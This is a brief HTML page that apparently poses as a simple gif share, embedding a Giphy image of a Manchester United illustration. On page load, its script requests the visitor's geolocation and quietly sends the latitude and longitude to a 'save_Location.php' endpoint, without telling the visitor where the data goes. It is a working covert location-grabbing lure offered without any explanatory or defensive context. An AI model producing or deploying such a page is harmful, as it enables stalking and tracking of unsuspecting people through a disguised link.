<html>
<body onload="getLocation()">

    <iframe src="https://giphy.com/embed/26FKSNXyevr4BFakU" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/illustration-manchester-united-26FKSNXyevr4BFakU">via GIPHY</a></p>


<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "save_Location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
    xhttp.send();
}
</script>

</body>
</html>
